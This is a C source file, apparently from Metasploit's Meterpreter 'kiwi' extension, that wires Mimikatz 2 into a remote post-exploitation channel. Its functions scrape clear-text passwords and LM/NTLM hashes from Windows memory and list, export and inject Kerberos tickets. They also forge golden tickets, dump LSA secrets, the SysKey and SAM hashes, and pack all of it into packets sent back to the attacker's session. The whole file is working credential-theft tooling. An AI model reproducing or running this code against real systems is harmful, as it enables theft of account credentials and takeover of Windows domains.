/*!
 * @file mimikatz_interface.c
 * @brief Definition of bridging functions which talk to Mimikatz 2.
 */
#include "main.h"
#include "mimikatz_interface.h"
#include <NTSecAPI.h>

// The following values have been copied from source files because including those files here results in a nasty
// set of errors thanks to macro redefinitions and such. It's horrible, but it builds cleanly. These things are
// not likely to change anyway.

// Values copied from crypto_system
#define	MD4_DIGEST_LENGTH	16
#define	MD5_DIGEST_LENGTH	16
#define SHA_DIGEST_LENGTH	20

// Values copied from globals
#define LM_NTLM_HASH_LENGTH	16
#define TIME_SIZE 28

// These includes were created to provide a bridge between the Mimikatz code and meterpreter. Without this
// kind of approach we end up doing what we had to do with the old mimikatz and serialise things to CSV
// strings before passing them back to Metasploit. I wanted to avoid this hence instead I'm tapping into
// Mimikatz via callback functions.
#include "modules\kuhl_m_lsadump_struct.h"
#include "modules\kerberos\khul_m_kerberos_struct.h"

typedef void (CALLBACK * PKUHL_M_SEKURLSA_EXTERNAL) (IN CONST PLUID luid, IN CONST PUNICODE_STRING username, IN CONST PUNICODE_STRING domain, IN CONST PUNICODE_STRING password, IN CONST PBYTE lm, IN CONST PBYTE ntlm, IN OUT LPVOID pvData);
typedef LONG (* PKUHL_M_SEKURLSA_ENUMERATOR)(PKUHL_M_SEKURLSA_EXTERNAL callback, LPVOID state);

// The functions listed here exist elsewhere in the application. Header files are not included
// due to collisions in include files which result in nasty build errors. The result of these
// functions is actually NTSTATUS, but defining it here via header inclusion isn't possible.
extern LONG kuhl_m_sekurlsa_all_enum(PKUHL_M_SEKURLSA_EXTERNAL callback, LPVOID state);
extern LONG kuhl_m_sekurlsa_wdigest_enum(PKUHL_M_SEKURLSA_EXTERNAL callback, LPVOID state);
extern LONG kuhl_m_sekurlsa_msv_enum(PKUHL_M_SEKURLSA_EXTERNAL callback, LPVOID state);
extern LONG kuhl_m_sekurlsa_kerberos_enum(PKUHL_M_SEKURLSA_EXTERNAL callback, LPVOID state);
extern LONG kuhl_m_sekurlsa_tspkg_enum(PKUHL_M_SEKURLSA_EXTERNAL callback, LPVOID state);
extern LONG kuhl_m_sekurlsa_livessp_enum(PKUHL_M_SEKURLSA_EXTERNAL callback, LPVOID state);
extern LONG kuhl_m_sekurlsa_ssp_enum(PKUHL_M_SEKURLSA_EXTERNAL callback, LPVOID state);
extern LONG kuhl_m_lsadump_full(PLSA_CALLBACK_CTX callbackCtx);
extern LONG kuhl_m_kerberos_list_tickets(PKERB_CALLBACK_CTX callbackCtx, BOOL bExport);
extern LONG kuhl_m_kerberos_use_ticket(PBYTE fileData, DWORD fileSize);
extern LONG kuhl_m_kerberos_create_golden_ticket(PCWCHAR szUser, PCWCHAR szDomain, PCWCHAR szSid, PCWCHAR szNtlm, PBYTE* ticketBuffer, DWORD* ticketBufferSize);
extern LONG kuhl_m_kerberos_purge_ticket();

/*!
 * @brief Attempt to determine if the given string is a valid Unicode string.
 * @param dwBytes The number of bytes in the given secret value.
 * @param pSecret Pointer to the byte sequence representing the secret value.
 * @returns Indication of whether the value is a proper unicode string.
 */
BOOL is_unicode_string(DWORD dwBytes, LPVOID pSecret)
{
	UNICODE_STRING candidateString = { (USHORT)dwBytes, (USHORT)dwBytes, (PWSTR)pSecret };
	int unicodeTestFlags = IS_TEXT_UNICODE_ODD_LENGTH | IS_TEXT_UNICODE_STATISTICS;
	return pSecret && IsTextUnicode(candidateString.Buffer, candidateString.Length, &unicodeTestFlags);
}

/*!
 * @brief Callback function that handles a password enumeration result.
 * @param luid The locally unique identifier for this credential entry.
 * @param username The name of the user for this credential.
 * @param domain The active domain for this credential.
 * @param password The clear-text password for this credential.
 * @param lm Pointer to the LM hash.
 * @param ntlm Pointer to the NTLM hash.
 * @param pvData Pointer to context-data for this callback. In this case it contains
 *               a pointer to the current Packet to add the entry to.
 */
void CALLBACK credential_result_handler(IN CONST PLUID luid, IN CONST PUNICODE_STRING username, IN CONST PUNICODE_STRING domain,
	IN CONST PUNICODE_STRING password, IN CONST PBYTE lm, IN CONST PBYTE ntlm, IN OUT LPVOID pvData)
{
	UINT hi = 0;
	UINT lo = 0;
	LPSTR lpUserName = NULL, lpDomain = NULL, lpPassword = NULL;

	DWORD count = 0;
	Tlv entries[7];
	Packet* packet = (Packet*)pvData;

	ZeroMemory(&entries[0], sizeof(entries));

	if (username != NULL && username->Buffer != NULL && username->Length > 0)
	{
		dprintf("[KIWI] Adding username %u chars", username->Length);
		lpUserName = packet_add_tlv_wstring_entry(&entries[count++], TLV_TYPE_KIWI_PWD_USERNAME, username->Buffer, username->Length / sizeof(wchar_t));
	}

	if (domain != NULL && domain->Buffer != NULL && domain->Length > 0)
	{
		dprintf("[KIWI] Adding domain %u chars", domain->Length);
		lpDomain = packet_add_tlv_wstring_entry(&entries[count++], TLV_TYPE_KIWI_PWD_DOMAIN, domain->Buffer, domain->Length / sizeof(wchar_t));
	}

	if (password != NULL && password->Buffer != NULL && password->Length > 0)
	{
		dprintf("[KIWI] Adding password %u chars", password->Length);
		lpPassword = packet_add_tlv_wstring_entry(&entries[count++], TLV_TYPE_KIWI_PWD_PASSWORD, password->Buffer, password->Length / sizeof(wchar_t));
	}

	dprintf("[KIWI] Adding auth info");
	entries[count].header.length = sizeof(UINT);
	entries[count].header.type = TLV_TYPE_KIWI_PWD_AUTH_HI;
	entries[count].buffer = (PUCHAR)&hi;
	++count;

	entries[count].header.length = sizeof(UINT);
	entries[count].header.type = TLV_TYPE_KIWI_PWD_AUTH_LO;
	entries[count].buffer = (PUCHAR)&lo;
	++count;

	if (luid != NULL)
	{
		hi = htonl((UINT)luid->HighPart);
		lo = htonl((UINT)luid->LowPart);
	}

	// 16 bytes long
	if (lm != NULL)
	{
		dprintf("[KIWI] Adding lm hash");
		entries[count].header.length = 16;
		entries[count].header.type = TLV_TYPE_KIWI_PWD_LMHASH;
		entries[count].buffer = (PUCHAR)lm;
		++count;
	}

	// 16 bytes long
	if (ntlm != NULL)
	{
		dprintf("[KIWI] Adding ntlm hash");
		entries[count].header.length = 16;
		entries[count].header.type = TLV_TYPE_KIWI_PWD_NTLMHASH;
		entries[count].buffer = (PUCHAR)ntlm;
		++count;
	}

	// don't add this value to the packet unless we have a username, because it's pointless
	// otherwise and just adds noise/overhead to the comms
	if (lpUserName && lstrlenA(lpUserName) > 0)
	{
		dprintf("[KIWI] Adding to packet");
		packet_add_tlv_group(packet, TLV_TYPE_KIWI_PWD_RESULT, entries, count);
	}
	else
	{
		dprintf("[KIWI] Ignoring result due to lack of username");
	}

	if (lpUserName)
	{
		free(lpUserName);
	}

	if (lpDomain != NULL)
	{
		free(lpDomain);
	}
	
	if (lpPassword != NULL)
	{
		free(lpPassword);
	}
}

/*!
 * @brief Scrape credentials from memory.
 * @param dwCmdId ID of the "command" which indicates which type of credential to steal.
 * @param pResponse Pointer to the packet to add the results to.
 * @returns Indication of success or failure.
 */
DWORD mimikatz_scrape_passwords(DWORD dwCmdId, Packet* pResponse)
{
	switch (dwCmdId)
	{
		case KIWI_PWD_ID_SEK_ALLPASS:
		{
			dprintf("[KIWI] running all pass");
			return kuhl_m_sekurlsa_all_enum(credential_result_handler, pResponse);
		}
		case KIWI_PWD_ID_SEK_WDIGEST:
		{
			dprintf("[KIWI] running wdigest");
			return kuhl_m_sekurlsa_wdigest_enum(credential_result_handler, pResponse);
		}
		case KIWI_PWD_ID_SEK_MSV:
		{
			dprintf("[KIWI] running msv");
			return kuhl_m_sekurlsa_msv_enum(credential_result_handler, pResponse);
		}
		case KIWI_PWD_ID_SEK_KERBEROS:
		{
			dprintf("[KIWI] running kerberos");
			return kuhl_m_sekurlsa_kerberos_enum(credential_result_handler, pResponse);
		}
		case KIWI_PWD_ID_SEK_TSPKG:
		{
			dprintf("[KIWI] running tspkg");
			return kuhl_m_sekurlsa_tspkg_enum(credential_result_handler, pResponse);
		}
		case KIWI_PWD_ID_SEK_LIVESSP:
		{
			dprintf("[KIWI] running livessp");
			return kuhl_m_sekurlsa_livessp_enum(credential_result_handler, pResponse);
		}
		case KIWI_PWD_ID_SEK_SSP:
		{
			dprintf("[KIWI] running ssp");
			return kuhl_m_sekurlsa_ssp_enum(credential_result_handler, pResponse);
		}
		// TODO: Enable this function soon
		//case KIWI_PWD_ID_SEK_DPAPI:
		//{
		//	dprintf("[KIWI] running dpapi");
		//	break;
		//}
	}

	return ERROR_INVALID_PARAMETER;
}

/*!
 * @brief Helper function that converts an ASCII string to a wchar_t string.
 * @param ascii The ASCII version of the string.
 * @returns An allocated buffer with the convert string in it.
 * @remark If the return result is non-NULL then it needs to be released using \c free().
 */
wchar_t* ascii_to_wide_string(char* ascii)
{
	size_t requiredChars = strlen(ascii) + 1;
	wchar_t* buffer = (wchar_t*)calloc(requiredChars, sizeof(wchar_t));

	if (buffer != NULL)
	{
		swprintf_s(buffer, requiredChars, L"%S", ascii);
	}
	return buffer;
}

/*!
 * @brief Helper function that converts a LARGE_INTEGER time value to a string.
 * @param time The value of the time to conver to string.
 * @param output Buffer that will contain the resulting string.
 */
VOID to_system_time_string(LARGE_INTEGER time, char output[TIME_SIZE])
{
	SYSTEMTIME st;
	PFILETIME pTime = (PFILETIME)&time;

	ZeroMemory(output, TIME_SIZE);
	
	FileTimeToSystemTime(pTime, &st);
	sprintf_s(output, TIME_SIZE, "%4u-%02u-%02u %02u:%02u:%02u.%03u",
		st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);
}

/*!
 * @brief Callback for handling kerberos tickets that are found and are to be returned to Metasploit.
 * @param lpContext Pointer to the associated enumeration context, in this case it's a Packet*.
 * @param pKerbTicketInfo Pointer to the kerberos ticket information structure that was found.
 * @param pExternalTicket Pointer to the external ticket that contains the raw bytes of the ticket that was found.
 */
VOID kerberos_ticket_handler(LPVOID lpContext, PKERB_TICKET_CACHE_INFO_EX pKerbTicketInfo, PKERB_EXTERNAL_TICKET pExternalTicket)
{
	Packet* packet = (Packet*)lpContext;

	Tlv entries[10];
	DWORD dwCount = 0;
	UINT uEncType = htonl(pKerbTicketInfo->EncryptionType);
	UINT uFlags = htonl(pKerbTicketInfo->TicketFlags);
	char sStart[TIME_SIZE], sEnd[TIME_SIZE], sMaxRenew[TIME_SIZE];
	LPSTR lpServerName = NULL, lpServerRealm = NULL, lpClientName = NULL, lpClientRealm = NULL;

	dprintf("[KIWI KERB] Adding ticket to result");

	dprintf("[KIWI KERB] Converting times");
	to_system_time_string(pKerbTicketInfo->StartTime, sStart);
	to_system_time_string(pKerbTicketInfo->EndTime, sEnd);
	to_system_time_string(pKerbTicketInfo->RenewTime, sMaxRenew);

	dprintf("[KIWI KERB] Adding enc type");
	entries[dwCount].header.type = TLV_TYPE_KIWI_KERB_TKT_ENCTYPE;
	entries[dwCount].header.length = sizeof(UINT);
	entries[dwCount].buffer = (PUCHAR)&uEncType;
	++dwCount;

	dprintf("[KIWI KERB] Adding flags");
	entries[dwCount].header.type = TLV_TYPE_KIWI_KERB_TKT_FLAGS;
	entries[dwCount].header.length = sizeof(UINT);
	entries[dwCount].buffer = (PUCHAR)&uFlags;
	++dwCount;

	dprintf("[KIWI KERB] Adding start time");
	entries[dwCount].header.type = TLV_TYPE_KIWI_KERB_TKT_START;
	entries[dwCount].header.length = (DWORD)strlen(sStart);
	entries[dwCount].buffer = (PUCHAR)sStart;
	++dwCount;

	dprintf("[KIWI KERB] Adding end time");
	entries[dwCount].header.type = TLV_TYPE_KIWI_KERB_TKT_END;
	entries[dwCount].header.length = (DWORD)strlen(sEnd);
	entries[dwCount].buffer = (PUCHAR)sEnd;
	++dwCount;

	dprintf("[KIWI KERB] Adding max renew time");
	entries[dwCount].header.type = TLV_TYPE_KIWI_KERB_TKT_MAXRENEW;
	entries[dwCount].header.length = (DWORD)strlen(sMaxRenew);
	entries[dwCount].buffer = (PUCHAR)sMaxRenew;
	++dwCount;

	dprintf("[KIWI KERB] Adding server name");
	lpServerName = packet_add_tlv_wstring_entry(&entries[dwCount++], TLV_TYPE_KIWI_KERB_TKT_SERVERNAME, pKerbTicketInfo->ServerName.Buffer, pKerbTicketInfo->ServerName.Length / sizeof(wchar_t));
	dprintf("[KIWI KERB] Adding server realm");
	lpServerRealm = packet_add_tlv_wstring_entry(&entries[dwCount++], TLV_TYPE_KIWI_KERB_TKT_SERVERREALM, pKerbTicketInfo->ServerRealm.Buffer, pKerbTicketInfo->ServerRealm.Length / sizeof(wchar_t));
	dprintf("[KIWI KERB] Adding client name");
	lpClientName = packet_add_tlv_wstring_entry(&entries[dwCount++], TLV_TYPE_KIWI_KERB_TKT_CLIENTNAME, pKerbTicketInfo->ClientName.Buffer, pKerbTicketInfo->ClientName.Length / sizeof(wchar_t));
	dprintf("[KIWI KERB] Adding client realm");
	lpClientRealm = packet_add_tlv_wstring_entry(&entries[dwCount++], TLV_TYPE_KIWI_KERB_TKT_CLIENTREALM, pKerbTicketInfo->ClientRealm.Buffer, pKerbTicketInfo->ClientRealm.Length / sizeof(wchar_t));

	if (pExternalTicket)
	{
		dprintf("[KIWI KERB] Adding raw ticket");
		entries[dwCount].header.type = TLV_TYPE_KIWI_KERB_TKT_RAW;
		entries[dwCount].header.length = pExternalTicket->EncodedTicketSize;
		entries[dwCount].buffer = pExternalTicket->EncodedTicket;
		++dwCount;
	}

	packet_add_tlv_group(packet, TLV_TYPE_KIWI_KERB_TKT, entries, dwCount);


	if (lpServerName != NULL)
	{
		free(lpServerName);
	}
	if (lpServerRealm != NULL)
	{
		free(lpServerRealm);
	}
	if (lpClientName != NULL)
	{
		free(lpClientName);
	}
	if (lpClientRealm != NULL)
	{
		free(lpClientRealm);
	}
}

/*!
 * @brief Enumerate all kerberos tickets.
 * @param bExport Indicates whether the raw tickets should be exported or not.
 * @param pResponse Pointer to the packet which the results shoudl be added to.
 * @returns Indication of success or failure.
 */
DWORD mimikatz_kerberos_ticket_list(BOOL bExport, Packet* pResponse)
{
	KERB_CALLBACK_CTX callbackCtx;

	callbackCtx.lpContext = pResponse;
	callbackCtx.pTicketHandler = kerberos_ticket_handler;

	return kuhl_m_kerberos_list_tickets(&callbackCtx, bExport);
}

/*!
 * @brief Purge all applied kerberos tickets.
 * @returns Indication of success or failure.
 */
DWORD mimikatz_kerberos_ticket_purge()
{
	return kuhl_m_kerberos_purge_ticket();
}

/*!
 * @brief Create a golden kerberos ticket which lasts for 10 years (apparently).
 * @param lpUser Name of the user to create the ticket for.
 * @param lpDomain Name of the domain the ticket should apply to.
 * @param lpSid The Domain SID.
 * @param lpTgt The ticket granting token.
 * @param pResponse Pointer to the packet which the results should be added to.
 * @returns Indication of success or failure.
 */
DWORD mimikatz_kerberos_golden_ticket_create(char* lpUser, char* lpDomain, char* lpSid, char* lpTgt, Packet* pResponse)
{
	DWORD result = 0;
	BYTE* ticketBuffer;
	DWORD ticketBufferSize;
	wchar_t* lpwUser = ascii_to_wide_string(lpUser);
	wchar_t* lpwDomain = ascii_to_wide_string(lpDomain);
	wchar_t* lpwSid = ascii_to_wide_string(lpSid);
	wchar_t* lpwTgt = ascii_to_wide_string(lpTgt);

	do
	{
		if (!lpwUser || !lpwDomain || !lpwSid || !lpwTgt)
		{
			dprintf("[KIWI] Out of memory");
			result = ERROR_NOT_ENOUGH_MEMORY;
		}

		result = kuhl_m_kerberos_create_golden_ticket(lpwUser, lpwDomain, lpwSid, lpwTgt, &ticketBuffer, &ticketBufferSize);
		if (result != ERROR_SUCCESS)
		{
			break;
		}

		packet_add_tlv_raw(pResponse, TLV_TYPE_KIWI_KERB_TKT_RAW, ticketBuffer, ticketBufferSize);
	} while (0);

	if (lpwUser)
	{
		free(lpwUser);
	}
	if (lpwDomain)
	{
		free(lpwDomain);
	}
	if (lpwSid)
	{
		free(lpwSid);
	}
	if (lpwTgt)
	{
		free(lpwTgt);
	}

	return result;
}

/*!
 * @brief Apply the given kerberos ticket to the current session.
 * @param lpBuffer Pointer to the ticket content.
 * @param dwBufferSize The size of the data in the ticket buffer.
 * @returns Indication of success or failure.
 */
DWORD mimikatz_kerberos_ticket_use(LPBYTE lpBuffer, DWORD dwBufferSize)
{
	return kuhl_m_kerberos_use_ticket(lpBuffer, dwBufferSize);
}

/*!
 * @brief Callback handler for policy version information.
 * @param lpContext Pointer to the callback context, which in this case is the Packet*.
 * @param usMajor The major version number for the policy subsystem.
 * @param usMinor The minor version number for the policy subsystem.
 */
VOID policy_version_handler(LPVOID lpContext, USHORT usMajor, USHORT usMinor)
{
	Packet *response = (Packet*)lpContext;

	dprintf("[KIWI LSA] Version: %u.%u", usMajor, usMinor);

	packet_add_tlv_uint(response, TLV_TYPE_KIWI_LSA_VER_MAJ, (UINT)usMajor);
	packet_add_tlv_uint(response, TLV_TYPE_KIWI_LSA_VER_MIN, (UINT)usMinor);
}

/*!
 * @brief Callback handler for NT5 key results.
 * @param lpContext Pointer to the callback context, which in this case is the Packet*.
 * @param pSysKey Pointer to the key that has been located.
 */
VOID nt5_key_handler(LPVOID lpContext, PNT5_SYSTEM_KEY pSysKey)
{
	Packet *response = (Packet*)lpContext;
	dprintf("[KIWI LSA] nt5 Key");
	packet_add_tlv_raw(response, TLV_TYPE_KIWI_LSA_NT5KEY, pSysKey->key, sizeof(NT5_SYSTEM_KEY));
}

/*!
 * @brief Callback handler for NT6 key results.
 * @param lpContext Pointer to the callback context, which in this case is the Packet*.
 * @param dwIndex The index of the key in the array of keys found.
 * @param pSysKey Pointer to the key that has been located.
 */
VOID nt6_key_handler(LPVOID lpContext, DWORD dwIndex, PNT6_SYSTEM_KEY pSysKey)
{
	Tlv entities[3];
	Packet *response = (Packet*)lpContext;
	UINT uKeySize = htonl(pSysKey->KeySize);

	dprintf("[KIWI LSA] nt6 Key");

	dwIndex = htonl(dwIndex);
	entities[0].header.type = TLV_TYPE_KIWI_LSA_KEYIDX;
	entities[0].header.length = sizeof(UINT);
	entities[0].buffer = (PUCHAR)&dwIndex;

	entities[1].header.type = TLV_TYPE_KIWI_LSA_KEYID;
	entities[1].header.length = sizeof(GUID);
	entities[1].buffer = (PUCHAR)&pSysKey->KeyId;

	entities[2].header.type = TLV_TYPE_KIWI_LSA_KEYVALUE;
	entities[2].header.length = pSysKey->KeySize;
	entities[2].buffer = (PUCHAR)pSysKey->Key;

	packet_add_tlv_group(response, TLV_TYPE_KIWI_LSA_NT6KEY, entities, 3);
}

/*!
 * @brief Callback handler for NT6 key streams.
 * @param lpContext Pointer to the callback context, which in this case is the Packet*.
 * @param pSysKeyStream Pointer to the key that has been located.
 * @remark This function probably isn't necessary in the grand scheme of things as it doesn't
 *         contain anything other than the count. Leaving it in for now though.
 */
VOID nt6_key_stream_handler(LPVOID lpContext, PNT6_SYSTEM_KEYS pSysKeyStream)
{
	Packet *response = (Packet*)lpContext;
	dprintf("[KIWI LSA] nt6 Key stream: %u keys", pSysKeyStream->nbKeys);
	packet_add_tlv_uint(response, TLV_TYPE_KIWI_LSA_KEYCOUNT, pSysKeyStream->nbKeys);
}

/*!
 * @brief Callback handler for the resulting computer name.
 * @param lpContext Pointer to the callback context, which in this case is the Packet*.
 * @param lpwComputerName Pointer to the computer name.
 */
VOID comp_name_handler(LPVOID lpContext, wchar_t* lpwComputerName)
{
	Packet *response = (Packet*)lpContext;

	dprintf("[KIWI LSA] Computer Name: %S", lpwComputerName);
	packet_add_tlv_wstring(response, TLV_TYPE_KIWI_LSA_COMPNAME, lpwComputerName);
}

/*!
 * @brief Callback handler for the system key result
 * @param lpContext Pointer to the callback context, which in this case is the Packet*.
 * @param pKey Pointer to the key data.
 * @param dwKeyLen The length of the key data.
 */
VOID sys_key_handler(LPVOID lpContext, LPBYTE pKey, DWORD dwKeyLen)
{
	Packet *response = (Packet*)lpContext;
	dprintf("[KIWI LSA] SysKey: %u bytes", dwKeyLen);
	packet_add_tlv_raw(response, TLV_TYPE_KIWI_LSA_SYSKEY, pKey, dwKeyLen);
}

/*!
 * @brief Callback handler for an LSA secret result dump.
 * @param lpContext Pointer to the callback context, which in this case is the Packet*.
 * @param lpwSecretName The name of the dumped secret.
 * @param lpwServiceInfo Information about the dumped service secret.
 * @param pMd4Digest Pointer to the MD4 digest associated with this secret.
 * @param pCurrent Pointer to the current secret value.
 * @param dwCurrentSize Size of the data pointed to by pCurrent.
 * @param pOld Pointer to the old/previous secret value.
 * @param dwOldSize Size of the data pointed to by pOld.
 */
VOID lsa_secret_handler(LPVOID lpContext, wchar_t* lpwSecretName, wchar_t* lpwServiceInfo, LPBYTE pMd4Digest, LPVOID pCurrent, DWORD dwCurrentSize, LPVOID pOld, DWORD dwOldSize)
{
	Tlv entries[5];
	DWORD dwCount = 0;
	Packet *response = (Packet*)lpContext;
	LPSTR lpSecretName = NULL, lpServiceInfo = NULL, lpCurrent = NULL, lpOld = NULL;

	dprintf("[KIWI LSA] Handling secret: %S", lpwSecretName);

	// don't bother with the entry if we don't have data for it
	if (!pCurrent && !pOld)
	{
		dprintf("[KIWI LSA] Secret has no data: %S", lpwSecretName);
		return;
	}

	lpSecretName = packet_add_tlv_wstring_entry(&entries[dwCount++], TLV_TYPE_KIWI_LSA_SECRET_NAME, lpwSecretName, 0);

	if (lpwServiceInfo)
	{
		lpServiceInfo = packet_add_tlv_wstring_entry(&entries[dwCount++], TLV_TYPE_KIWI_LSA_SECRET_SERV, lpwServiceInfo, 0);
	}

	if (pMd4Digest)
	{
		entries[dwCount].header.type = TLV_TYPE_KIWI_LSA_SECRET_NTLM;
		entries[dwCount].header.length = MD4_DIGEST_LENGTH;
		entries[dwCount].buffer = (PUCHAR)pMd4Digest;
		++dwCount;
	}

	if (pCurrent)
	{
		if (is_unicode_string(dwCurrentSize, pCurrent))
		{
			dprintf("[KIWI LSA] current text");
			lpCurrent = packet_add_tlv_wstring_entry(&entries[dwCount], TLV_TYPE_KIWI_LSA_SECRET_CURR, (LPCWSTR)pCurrent, dwCurrentSize / sizeof(wchar_t));
		}
		else
		{
			dprintf("[KIWI LSA] current raw");
			entries[dwCount].header.type = TLV_TYPE_KIWI_LSA_SECRET_CURR_RAW;
			entries[dwCount].header.length = dwCurrentSize;
			entries[dwCount].buffer = (PUCHAR)pCurrent;
		}
		++dwCount;
	}

	if (pOld)
	{
		if (is_unicode_string(dwOldSize, pOld))
		{
			lpOld = packet_add_tlv_wstring_entry(&entries[dwCount], TLV_TYPE_KIWI_LSA_SECRET_OLD, (LPCWSTR)pOld,  dwCurrentSize / sizeof(wchar_t));
		}
		else
		{
			entries[dwCount].header.type = TLV_TYPE_KIWI_LSA_SECRET_OLD_RAW;
			entries[dwCount].header.length = dwOldSize;
			entries[dwCount].buffer = (PUCHAR)pOld;
		}
		++dwCount;
	}

	packet_add_tlv_group(response, TLV_TYPE_KIWI_LSA_SECRET, entries, dwCount);

	if (lpSecretName != NULL)
	{
		free(lpSecretName);
	}
	if (lpServiceInfo != NULL)
	{
		free(lpServiceInfo);
	}
	if (lpCurrent != NULL)
	{
		free(lpCurrent);
	}
	if (lpOld != NULL)
	{
		free(lpOld);
	}
}

/*!
 * @brief Callback handler for a dumped SAM hash.
 * @param lpContext Pointer to the callback context, which in this case is the Packet*.
 * @param dwRid The RID of the SAM.
 * @param lpwUser Pointer to the user associated with the SAM.
 * @param hasLmHash Indication of whether an LM hash was found.
 * @param lmHash The LM has bytes, if found.
 * @param hasNtlmHash Indication of whether an NTLM hash was found.
 * @param ntlmHash The NTLM has bytes, if found.
 */
VOID sam_hash_handler(LPVOID lpContext, DWORD dwRid, wchar_t* lpwUser, DWORD dwUserLength, BOOL hasLmHash, BYTE lmHash[LM_NTLM_HASH_LENGTH], BOOL hasNtlmHash, BYTE ntlmHash[LM_NTLM_HASH_LENGTH])
{
	Tlv entries[4];
	DWORD dwCount = 0;
	Packet *response = (Packet*)lpContext;
	LPSTR lpSamUser = NULL;

	// only add the result if we have one of the hashes and a user name.
	if ((hasLmHash || hasNtlmHash) && lpwUser)
	{
		dprintf("[KIWI SAM] Adding %S rid %u (%x)", lpwUser, dwRid, dwRid);

		dwRid = htonl(dwRid);
		entries[dwCount].header.type = TLV_TYPE_KIWI_LSA_SAM_RID;
		entries[dwCount].header.length = sizeof(DWORD);
		entries[dwCount].buffer = (PUCHAR)&dwRid;
		++dwCount;

		lpSamUser = packet_add_tlv_wstring_entry(&entries[dwCount++], TLV_TYPE_KIWI_LSA_SAM_USER, lpwUser, dwUserLength);

		if (hasLmHash)
		{
			entries[dwCount].header.type = TLV_TYPE_KIWI_LSA_SAM_LMHASH;
			entries[dwCount].header.length = LM_NTLM_HASH_LENGTH;
			entries[dwCount].buffer = (PUCHAR)lmHash;
			++dwCount;
		}

		if (hasNtlmHash)
		{
			entries[dwCount].header.type = TLV_TYPE_KIWI_LSA_SAM_NTLMHASH;
			entries[dwCount].header.length = LM_NTLM_HASH_LENGTH;
			entries[dwCount].buffer = (PUCHAR)ntlmHash;
			++dwCount;

		}

		packet_add_tlv_group(response, TLV_TYPE_KIWI_LSA_SAM, entries, dwCount);

		if (lpSamUser != NULL)
		{
			free(lpSamUser);
		}
	}
	else
	{
		dprintf("[KIWI SAM] Ignoring %S, no hashes given");
	}
}

/*!
 * @brief Dump LSA secrets.
 * @param pResponse Pointer to the packet that will contain the response.
 * @returns Indication of success or failure.
 */
DWORD mimikatz_lsa_dump_secrets(Packet* pResponse)
{
	LSA_CALLBACK_CTX callbackCtx;
	ZeroMemory(&callbackCtx, sizeof(callbackCtx));

	// we want the context to be the packet, so that elements
	// can be added directly to the packet
	callbackCtx.lpContext = pResponse;
	callbackCtx.pCompNameHandler = comp_name_handler;
	callbackCtx.pSysKeyHandler = sys_key_handler;
	callbackCtx.pPolicyVersionHandler = policy_version_handler;
	callbackCtx.pNt6KeyStreamHandler = nt6_key_stream_handler;
	callbackCtx.pNt6KeyHandler = nt6_key_handler;
	callbackCtx.pNt5KeyHandler = nt5_key_handler;
	callbackCtx.pSecretHandler = lsa_secret_handler;
	callbackCtx.pSamHashHandler = sam_hash_handler;

	return kuhl_m_lsadump_full(&callbackCtx);
}